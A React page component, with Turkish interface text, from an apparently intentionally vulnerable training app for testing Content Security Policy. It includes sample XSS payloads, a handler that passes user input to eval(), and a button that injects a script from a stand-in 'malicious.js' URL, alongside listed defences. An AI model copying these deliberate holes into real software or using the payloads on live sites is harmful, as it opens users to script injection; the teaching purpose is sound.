import React, { useState } from "react";
import { Box, TextField, Button, Typography, Paper, Alert, Grid, List, ListItem, ListItemText, ListItemIcon, Divider, Select, MenuItem, FormControl, InputLabel } from "@mui/material";
import { useVulnerability } from "../../context/VulnerabilityContext";
import { Security, Code, Warning, CheckCircle, Cloud } from '@mui/icons-material';

const CSPPage = () => {
  const [script, setScript] = useState("");
  const [result, setResult] = useState("");
  const [selectedExample, setSelectedExample] = useState("");
  const { vulnerabilities, toggleVulnerability } = useVulnerability();

  const scriptExamples = {
    alert: "<script>alert('XSS Test')</script>",
    console: "<script>console.log('Test Log')</script>",
    external: "<script src='https://example.com/malicious.js'></script>",
    event: "<img src='x' onerror='alert(1)'>",
    eval: "eval('alert(1)')"
  };

  const handleExecute = (e) => {
    e.preventDefault();
    if (vulnerabilities.csp) {
      // CSP açık - script çalıştırılabilir
      try {
        eval(script);
        setResult("Script başarıyla çalıştırıldı");
      } catch (error) {
        setResult(`Hata: ${error.message}`);
      }
    } else {
      // CSP kapalı - script engellenir
      setResult("CSP aktif - Script çalıştırma engellendi");
    }
  };

  const handleLoadExternal = () => {
    if (vulnerabilities.csp) {
      // CSP açık - harici script yüklenebilir
      const script = document.createElement('script');
      script.src = 'https://example.com/malicious.js';
      document.head.appendChild(script);
      setResult("Harici script yüklendi");
    } else {
      // CSP kapalı - harici script engellenir
      setResult("CSP aktif - Harici script yükleme engellendi");
    }
  };

  const handleExampleSelect = (example) => {
    setSelectedExample(example);
    setScript(scriptExamples[example]);
  };

  return (
    <Box m="20px">
      <Grid container spacing={3}>
        <Grid item xs={12} md={6}>
          <Paper elevation={3} sx={{ p: 3 }}>
            <Typography variant="h4" gutterBottom>
              CSP Test
            </Typography>
            <Box component="form" onSubmit={handleExecute} sx={{ mt: 2 }}>
              <FormControl fullWidth sx={{ mb: 2 }}>
                <InputLabel>Örnek Script Seçin</InputLabel>
                <Select
                  value={selectedExample}
                  onChange={(e) => handleExampleSelect(e.target.value)}
                  label="Örnek Script Seçin"
                >
                  <MenuItem value="alert">Alert Script</MenuItem>
                  <MenuItem value="console">Console Log</MenuItem>
                  <MenuItem value="external">Harici Script</MenuItem>
                  <MenuItem value="event">Event Handler</MenuItem>
                  <MenuItem value="eval">Eval Script</MenuItem>
                </Select>
              </FormControl>
              <TextField
                fullWidth
                label="JavaScript Kodu"
                value={script}
                onChange={(e) => setScript(e.target.value)}
                margin="normal"
                multiline
                rows={4}
              />
              <Button
                type="submit"
                variant="contained"
                color="primary"
                fullWidth
                sx={{ mt: 2 }}
              >
                Çalıştır
              </Button>
              <Button
                variant="outlined"
                color="secondary"
                fullWidth
                onClick={handleLoadExternal}
                sx={{ mt: 2 }}
              >
                Harici Script Yükle
              </Button>
            </Box>
            {result && (
              <Alert severity={result.includes("engellendi") ? "success" : "warning"} sx={{ mt: 2 }}>
                {result}
              </Alert>
            )}
          </Paper>
        </Grid>
        <Grid item xs={12} md={6}>
          <Paper elevation={3} sx={{ p: 3 }}>
            <Typography variant="h5" gutterBottom>
              Test Senaryoları ve Açıklamalar
            </Typography>
            <List>
              <ListItem>
                <ListItemIcon>
                  <Security color="primary" />
                </ListItemIcon>
                <ListItemText 
                  primary="Inline Script Testi" 
                  secondary="<script>alert('XSS')</script> gibi inline script'ler deneyin"
                />
              </ListItem>
              <Divider />
              <ListItem>
                <ListItemIcon>
                  <Code color="primary" />
                </ListItemIcon>
                <ListItemText 
                  primary="Harici Script Testi" 
                  secondary="<script src='https://example.com/malicious.js'></script> ile harici script yüklemeyi deneyin"
                />
              </ListItem>
              <Divider />
              <ListItem>
                <ListItemIcon>
                  <Warning color="primary" />
                </ListItemIcon>
                <ListItemText 
                  primary="Event Handler Testi" 
                  secondary="<img src='x' onerror='alert(1)'> gibi event handler'lar deneyin"
                />
              </ListItem>
              <Divider />
              <ListItem>
                <ListItemIcon>
                  <CheckCircle color="primary" />
                </ListItemIcon>
                <ListItemText 
                  primary="Güvenli Mod Testi" 
                  secondary="Switch'i kapatın ve aynı testleri tekrarlayın. Script çalıştırma engellenmelidir"
                />
              </ListItem>
            </List>

            <Box mt={3}>
              <Typography variant="h6">Güvenlik Önlemleri</Typography>
              <List>
                <ListItem>
                  <ListItemText 
                    primary="Content Security Policy" 
                    secondary="CSP header'ları ile script kaynaklarını kısıtlayın"
                  />
                </ListItem>
                <ListItem>
                  <ListItemText 
                    primary="Nonce ve Hash" 
                    secondary="Script'ler için nonce veya hash değerleri kullanın"
                  />
                </ListItem>
                <ListItem>
                  <ListItemText 
                    primary="Strict CSP" 
                    secondary="Strict CSP politikaları uygulayın"
                  />
                </ListItem>
              </List>
            </Box>
          </Paper>
        </Grid>
      </Grid>
    </Box>
  );
};

export default CSPPage; 